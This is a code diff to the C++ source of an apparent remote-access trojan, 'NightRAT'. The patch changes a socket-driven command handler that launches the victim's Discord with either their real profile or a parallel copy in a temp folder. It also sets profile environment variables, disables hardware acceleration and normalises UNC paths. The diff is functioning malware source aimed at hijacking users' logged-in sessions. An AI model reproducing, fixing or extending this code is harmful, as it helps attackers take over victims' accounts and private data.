@@ -1944,9 +1944,17 @@ static wstring get_app_path(const wstring& appName) {
     return path;
 }
 
+static wstring strip_unc_prefix(const wstring& path) {
+    if (path.rfind(L"\\\\?\\", 0) == 0) {
+        return path.substr(4);
+    }
+    return path;
+}
+
 static void disable_discord_hw_accel(const wstring& profilePath) {
     try {
-        fs::create_directories(profilePath);
+        wstring cleanProfile = strip_unc_prefix(profilePath);
+        fs::create_directories(cleanProfile);
         fs::path settingsPath = fs::path(profilePath) / L"settings.json";
         json settings;
         if (fs::exists(settingsPath)) {
@@ -2332,42 +2340,31 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring profileDir = L"Default";
 
                     if (wRequestedPath == L"Discord") {
-                        bool discordRunning = is_process_running(L"Discord.exe") || is_process_running(L"Update.exe");
+                        if (!copyProfile) {
+                            // If Copy Profile is disabled, use default normal Discord profile directly!
+                            profilePath = L""; // Empty so we don't set DISCORD_USER_DATA_DIR
 
-                        if (!discordRunning && !copyProfile) {
-                            // Discord is not running, and we did not ask to clone.
-                            // We can use the default real profile directory directly!
-                            wstring sourceUserData = get_browser_profile_path(wRequestedPath);
-                            profilePath = sourceUserData;
-
-                            // Ensure hardware acceleration is disabled in settings.json
-                            disable_discord_hw_accel(profilePath);
+                            wstring defaultProfile = get_browser_profile_path(L"Discord");
+                            if (!defaultProfile.empty()) {
+                                disable_discord_hw_accel(defaultProfile);
+                            }
                         } else {
-                            // Discord is running, or we checked copyProfile.
-                            // Use isolated profile directory to prevent DB lock.
+                            // If Copy Profile is enabled, use isolated profile directory to prevent DB lock.
                             wchar_t tempPath[MAX_PATH];
                             GetTempPathW(MAX_PATH, tempPath);
                             wstring tempProfileRoot = tempPath;
                             tempProfileRoot += L"NightRAT_Discord_Profile";
                             profilePath = tempProfileRoot;
 
-                            if (copyProfile) {
-                                wstring sourceUserData = get_browser_profile_path(wRequestedPath);
-                                if (!sourceUserData.empty() && fs::exists(sourceUserData)) {
-                                    try {
-                                        if (fs::exists(tempProfileRoot)) fs::remove_all(tempProfileRoot);
-                                    } catch (...) {}
-                                    if (!copy_profile_parallel(sourceUserData, tempProfileRoot, "Profiller kopyalanıyor")) {
-                                        send_error("Failed to copy Discord profile.");
-                                        return;
-                                    }
-                                }
-                            } else {
+                            wstring sourceUserData = get_browser_profile_path(wRequestedPath);
+                            if (!sourceUserData.empty() && fs::exists(sourceUserData)) {
                                 try {
-                                    if (!fs::exists(tempProfileRoot)) {
-                                        fs::create_directories(tempProfileRoot);
-                                    }
+                                    if (fs::exists(tempProfileRoot)) fs::remove_all(tempProfileRoot);
                                 } catch (...) {}
+                                if (!copy_profile_parallel(sourceUserData, tempProfileRoot, "Profiller kopyalanıyor")) {
+                                    send_error("Failed to copy Discord profile.");
+                                    return;
+                                }
                             }
 
                             disable_discord_hw_accel(profilePath);
@@ -2583,7 +2580,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         } catch (...) {}
                     }
 
-                    wstring fullCmd = L"\"" + exePath + L"\"" + args;
+                    wstring fullCmd = L"\"" + strip_unc_prefix(exePath) + L"\"" + args;
                     vector<wchar_t> cmdLine(fullCmd.begin(), fullCmd.end());
                     cmdLine.push_back(L'\0');
 
@@ -2604,8 +2601,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", L"1");
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
                     }
-                    if (wRequestedPath == L"Discord") {
-                        SetEnvironmentVariableW(L"DISCORD_USER_DATA_DIR", profilePath.c_str());
+                    if (wRequestedPath == L"Discord" && !profilePath.empty()) {
+                        SetEnvironmentVariableW(L"DISCORD_USER_DATA_DIR", strip_unc_prefix(profilePath).c_str());
                     }
 
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
@@ -2622,7 +2619,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", NULL);
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", NULL);
                     }
-                    if (wRequestedPath == L"Discord") {
+                    if (wRequestedPath == L"Discord" && !profilePath.empty()) {
                         SetEnvironmentVariableW(L"DISCORD_USER_DATA_DIR", NULL);
                     }
 
